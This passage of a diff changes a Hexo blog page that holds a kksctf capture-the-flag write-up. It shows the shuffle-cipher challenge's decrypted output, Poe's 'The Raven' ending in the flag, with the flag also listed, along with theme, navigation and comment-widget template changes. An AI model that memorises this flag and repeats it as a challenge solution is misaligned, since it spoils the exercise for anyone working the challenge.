-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ python3.7 shufllout.py</span><br><span class="line">seed: 3</span><br><span class="line">$ cat origin.txt</span><br><span class="line">Once upon a midnight dreary, <span class="keyword">while</span> I pondered, weak and weary,</span><br><span class="line">Over many a quaint and curious volume of forgotten lore—</span><br><span class="line">    While I nodded, nearly napping, suddenly there came a tapping,</span><br><span class="line">As of some one gently rapping, rapping at my chamber door.</span><br><span class="line">“’Tis some visitor,” I muttered, “tapping at my chamber door—</span><br><span class="line">            Only this and nothing more.”</span><br><span class="line"></span><br><span class="line">    Ah, distinctly I remember it was <span class="keyword">in</span> the bleak December;</span><br><span class="line">And each separate dying ember wrought its ghost upon the floor.</span><br><span class="line">    Eagerly I wished the morrow;—vainly I had sought to borrow</span><br><span class="line">    From my books surcease of sorrow—sorrow <span class="keyword">for</span> the lost Lenore—</span><br><span class="line">For the rare and radiant maiden whom the angels name Lenore—</span><br><span class="line">            Nameless here <span class="keyword">for</span> evermore.</span><br><span class="line"></span><br><span class="line">    And the silken, sad, uncertain rustling of each purple curtain</span><br><span class="line">Thrilled me—filled me with fantastic terrors never felt before;</span><br><span class="line">    So that now, to still the beating of my heart, I stood repeating</span><br><span class="line">    “’Tis some visitor entreating entrance at my chamber door—</span><br><span class="line">Some late visitor entreating entrance at my chamber door;—</span><br><span class="line">            This it is and nothing more.”</span><br><span class="line"></span><br><span class="line">    Presently my soul grew stronger; hesitating <span class="keyword">then</span> no longer,</span><br><span class="line">“Sir,” said I, “or Madam, truly your forgiveness I implore;</span><br><span class="line">    But the fact is I was napping, and so gently you came rapping,</span><br><span class="line">    And so faintly you came tapping, tapping at my chamber door,</span><br><span class="line">That I scarce was sure I heard you”—here I opened wide the door;—</span><br><span class="line">            Darkness there and nothing more.</span><br><span class="line"></span><br><span class="line">    Deep into that darkness peering, long I stood there wondering, fearing,</span><br><span class="line">Doubting, dreaming dreams no mortal ever dared to dream before;</span><br><span class="line">    But the silence was unbroken, and the stillness gave no token,</span><br><span class="line">    And the only word there spoken was the whispered word, “Lenore?”</span><br><span class="line">This I whispered, and an <span class="built_in">echo</span> murmured back the word, “Lenore!”—</span><br><span class="line">            Merely this and nothing more.</span><br><span class="line"></span><br><span class="line">    Back into the chamber turning, all my soul within me burning,</span><br><span class="line">Soon again I heard a tapping somewhat louder than before.</span><br><span class="line">    “Surely,” said I, “surely that is something at my window lattice;</span><br><span class="line">      Let me see, <span class="keyword">then</span>, what thereat is, and this mystery explore—</span><br><span class="line">Let my heart be still a moment and this mystery explore;—</span><br><span class="line">            ’Tis the wind and nothing more!”</span><br><span class="line"></span><br><span class="line">    Open here I flung the shutter, when, with many a flirt and flutter,</span><br><span class="line">In there stepped a stately Raven of the saintly days of yore;</span><br><span class="line">    Not the least obeisance made he; not a minute stopped or stayed he;</span><br><span class="line">    But, with mien of lord or lady, perched above my chamber door—</span><br><span class="line">Perched upon a bust of Pallas just above my chamber door—</span><br><span class="line">            Perched, and sat, and nothing more.</span><br><span class="line"></span><br><span class="line">Then this ebony bird beguiling my sad fancy into smiling,</span><br><span class="line">By the grave and stern decorum of the countenance it wore,</span><br><span class="line">“Though thy crest be shorn and shaven, thou,” I said, “art sure no craven,</span><br><span class="line">Ghastly grim and ancient Raven wandering from the Nightly shore—</span><br><span class="line">Tell me what thy lordly name is on the Night’s Plutonian shore!”</span><br><span class="line">            Quoth the Raven “kks&#123;5huffl3_5huffl3_5huffl3&#125;”</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">$ python3.7 shufllout.py</span><br><span class="line">seed: 3</span><br><span class="line">$ cat origin.txt</span><br><span class="line">Once upon a midnight dreary, <span class="keyword">while</span> I pondered, weak and weary,</span><br><span class="line">Over many a quaint and curious volume of forgotten lore—</span><br><span class="line">    While I nodded, nearly napping, suddenly there came a tapping,</span><br><span class="line">As of some one gently rapping, rapping at my chamber door.</span><br><span class="line">“’Tis some visitor,” I muttered, “tapping at my chamber door—</span><br><span class="line">            Only this and nothing more.”</span><br><span class="line"></span><br><span class="line">    Ah, distinctly I remember it was <span class="keyword">in</span> the bleak December;</span><br><span class="line">And each separate dying ember wrought its ghost upon the floor.</span><br><span class="line">    Eagerly I wished the morrow;—vainly I had sought to borrow</span><br><span class="line">    From my books surcease of sorrow—sorrow <span class="keyword">for</span> the lost Lenore—</span><br><span class="line">For the rare and radiant maiden whom the angels name Lenore—</span><br><span class="line">            Nameless here <span class="keyword">for</span> evermore.</span><br><span class="line"></span><br><span class="line">    And the silken, sad, uncertain rustling of each purple curtain</span><br><span class="line">Thrilled me—filled me with fantastic terrors never felt before;</span><br><span class="line">    So that now, to still the beating of my heart, I stood repeating</span><br><span class="line">    “’Tis some visitor entreating entrance at my chamber door—</span><br><span class="line">Some late visitor entreating entrance at my chamber door;—</span><br><span class="line">            This it is and nothing more.”</span><br><span class="line"></span><br><span class="line">    Presently my soul grew stronger; hesitating <span class="keyword">then</span> no longer,</span><br><span class="line">“Sir,” said I, “or Madam, truly your forgiveness I implore;</span><br><span class="line">    But the fact is I was napping, and so gently you came rapping,</span><br><span class="line">    And so faintly you came tapping, tapping at my chamber door,</span><br><span class="line">That I scarce was sure I heard you”—here I opened wide the door;—</span><br><span class="line">            Darkness there and nothing more.</span><br><span class="line"></span><br><span class="line">    Deep into that darkness peering, long I stood there wondering, fearing,</span><br><span class="line">Doubting, dreaming dreams no mortal ever dared to dream before;</span><br><span class="line">    But the silence was unbroken, and the stillness gave no token,</span><br><span class="line">    And the only word there spoken was the whispered word, “Lenore?”</span><br><span class="line">This I whispered, and an <span class="built_in">echo</span> murmured back the word, “Lenore!”—</span><br><span class="line">            Merely this and nothing more.</span><br><span class="line"></span><br><span class="line">    Back into the chamber turning, all my soul within me burning,</span><br><span class="line">Soon again I heard a tapping somewhat louder than before.</span><br><span class="line">    “Surely,” said I, “surely that is something at my window lattice;</span><br><span class="line">      Let me see, <span class="keyword">then</span>, what thereat is, and this mystery explore—</span><br><span class="line">Let my heart be still a moment and this mystery explore;—</span><br><span class="line">            ’Tis the wind and nothing more!”</span><br><span class="line"></span><br><span class="line">    Open here I flung the shutter, when, with many a flirt and flutter,</span><br><span class="line">In there stepped a stately Raven of the saintly days of yore;</span><br><span class="line">    Not the least obeisance made he; not a minute stopped or stayed he;</span><br><span class="line">    But, with mien of lord or lady, perched above my chamber door—</span><br><span class="line">Perched upon a bust of Pallas just above my chamber door—</span><br><span class="line">            Perched, and sat, and nothing more.</span><br><span class="line"></span><br><span class="line">Then this ebony bird beguiling my sad fancy into smiling,</span><br><span class="line">By the grave and stern decorum of the countenance it wore,</span><br><span class="line">“Though thy crest be shorn and shaven, thou,” I said, “art sure no craven,</span><br><span class="line">Ghastly grim and ancient Raven wandering from the Nightly shore—</span><br><span class="line">Tell me what thy lordly name is on the Night’s Plutonian shore!”</span><br><span class="line">            Quoth the Raven “kks&#123;5huffl3_5huffl3_5huffl3&#125;”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>flag: kks{5huffl3_5huffl3_5huffl3}</li>
@@ -467,42 +397,26 @@
     
     
     
-        
-      
 
       <footer class="post-footer">
-          
-            
-          
           <div class="post-tags">
-            
               <a href="/tags/kksctf/" rel="tag"># kksctf</a>
-            
           </div>
-        
 
         
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/12/29/meterpreter常用命令/" rel="next" title="meterpreter常用命令">
-                  <i class="fa fa-chevron-left"></i> meterpreter常用命令
-                </a>
-              
-            </div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2020/01/01/BambooFox-CTF-Move-or-not/" rel="prev" title="BambooFox CTF-Move or not">
-                  BambooFox CTF-Move or not <i class="fa fa-chevron-right"></i>
-                </a>
-              
-            </div>
-          </div>
         
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="prev" title="meterpreter常用命令">
+      <i class="fa fa-chevron-left"></i> meterpreter常用命令
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/01/BambooFox-CTF-Move-or-not/" rel="next" title="BambooFox CTF-Move or not">
+      BambooFox CTF-Move or not <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
     
   </article>
@@ -510,14 +424,33 @@
   
   
 
-  </div>
 
 
           </div>
           
-    
-    <div class="comments" id="comments"></div>
-  
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
         </div>
           
@@ -530,11 +463,6 @@
 
   <aside class="sidebar">
     <div class="sidebar-inner">
-        
-        
-        
-        
-      
 
       <ul class="sidebar-nav motion-element">
         <li class="sidebar-nav-toc">
@@ -547,120 +475,67 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ru-e5p-g3"><span class="nav-text">ru!e5p@g3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xmas-Tree"><span class="nav-text">Xmas Tree</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Stego-Warmup"><span class="nav-text">Stego Warmup</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Baby-buffer-overflow"><span class="nav-text">Baby buffer overflow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#insane-pwn"><span class="nav-text">insane pwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Buffalo-reverse"><span class="nav-text">Buffalo reverse</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xmas-Tree-2"><span class="nav-text">Xmas Tree 2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Postman"><span class="nav-text">Postman</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Every-day-I’m-shuffling"><span class="nav-text">Every day I’m shuffling</span></a></li></ol></li></ol></div>
-        
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ru-e5p-g3"><span class="nav-text">ru!e5p@g3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xmas-Tree"><span class="nav-text">Xmas Tree</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Stego-Warmup"><span class="nav-text">Stego Warmup</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Baby-buffer-overflow"><span class="nav-text">Baby buffer overflow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#insane-pwn"><span class="nav-text">insane pwn</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Buffalo-reverse"><span class="nav-text">Buffalo reverse</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xmas-Tree-2"><span class="nav-text">Xmas Tree 2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Postman"><span class="nav-text">Postman</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Every-day-I%E2%80%99m-shuffling"><span class="nav-text">Every day I’m shuffling</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image"
-      src="/images/avatar.gif"
-      alt="Demen Lee">
+    <img class="site-author-image" itemprop="image" alt="Demen Lee"
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">Demen Lee</p>
   <div class="site-description" itemprop="description">Sharing, Communicating more, then moving on......</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-        
           <a href="/archives/">
         
           <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-categories">
-        
-          
             <a href="/categories/">
           
-        
         <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">categories</span>
-        </a>
+        <span class="site-state-item-name">categories</span></a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-tags">
-        
-          
             <a href="/tags/">
           
-        
         <span class="site-state-item-count">33</span>
-        <span class="site-state-item-name">tags</span>
-        </a>
+        <span class="site-state-item-name">tags</span></a>
       </div>
-    
   </nav>
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/spwpun" title="GitHub &rarr; https://github.com/spwpun" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/spwpun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;spwpun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="mailto:spwpun@gmail.com" title="E-Mail &rarr; mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:spwpun@gmail.com" title="E-Mail → mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5536839794" title="Weibo &rarr; https://weibo.com/u/5536839794" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5536839794" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5536839794" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease &rarr; https://music.163.com/#/user/home?id=127070793" rel="noopener" target="_blank"><i class="fa fa-fw fa-netease"></i>Netease</a>
+        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;127070793" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Netease</a>
       </span>
-    
   </div>
 
 
   <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
       Links
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io" title="https://whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
         </li>
-      
         <li class="links-of-blogroll-item">
-          <a href="https://eternalhikari.github.io" title="https://eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
+          <a href="https://eternalhikari.github.io/" title="https:&#x2F;&#x2F;eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
         </li>
-      
     </ul>
   </div>
 
@@ -674,17 +549,23 @@
       </div>
     </main>
 
-    <footer id="footer" class="footer">
+    <footer class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-flag-checkered"></i>
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="flag-checkered"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Spwpun</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a></div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
 
         
 <div class="busuanzi-count">
@@ -697,9 +578,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-  
     <span class="post-meta-divider">|</span>
-  
     <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
@@ -708,7 +587,6 @@
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
-  
 </div>
 
 
@@ -718,51 +596,47 @@
 
 
 
-
-
-
-
-        
       </div>
     </footer>
   </div>
 
   
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
-<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/js/next-boot.js?v=7.4.1"></script>
+<script src="/js/utils.js"></script>
 
-
-
-  
+<script src="/js/motion.js"></script>
 
 
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-
-
-  <script src="/js/local-search.js?v=7.4.1"></script>
-
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
 
   
 
@@ -770,29 +644,31 @@
 
 
 <script>
-NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
-  var GUEST = ['nick', 'mail', 'link'];
-  var guest = 'nick,mail,link';
-  guest = guest.split(',').filter(item => {
-    return GUEST.includes(item);
-  });
-  new Valine({
-    el: '#comments',
-    verify: true,
-    notify: false,
-    appId: 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
-    appKey: 'qdSjFo9LUO20Ba6XRPMQGX7v',
-    placeholder: 'Leave something interesting......',
-    avatar: 'mm',
-    meta: guest,
-    pageSize: '10' || 10,
-    visitor: true,
-    lang: '' || 'zh-cn',
-    path: location.pathname,
-    recordIP: false,
-    serverURLs: ''
-  });
-}, window.Valine);
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : false,
+      appId      : 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
+      appKey     : 'qdSjFo9LUO20Ba6XRPMQGX7v',
+      placeholder: "Leave something interesting......",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
 </script>
 
 </body>
